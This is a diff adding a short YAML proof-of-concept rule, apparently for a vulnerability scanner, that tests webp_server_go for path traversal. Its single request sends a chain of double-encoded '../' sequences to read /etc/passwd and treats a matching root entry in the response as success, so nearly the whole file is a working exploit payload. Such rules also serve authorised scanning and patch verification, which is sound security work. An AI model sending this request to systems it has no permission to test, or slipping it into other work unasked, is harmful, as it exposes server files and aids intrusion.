@@ -1,0 +1,15 @@
+name: poc-yaml-webp-server-go-path-traversal
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: r0()
+detail:
+    author: 黔灵山Xo.(https://github.com/li8u99)
+    links:
+        - https://github.com/webp-sh/webp_server_go/issues/92
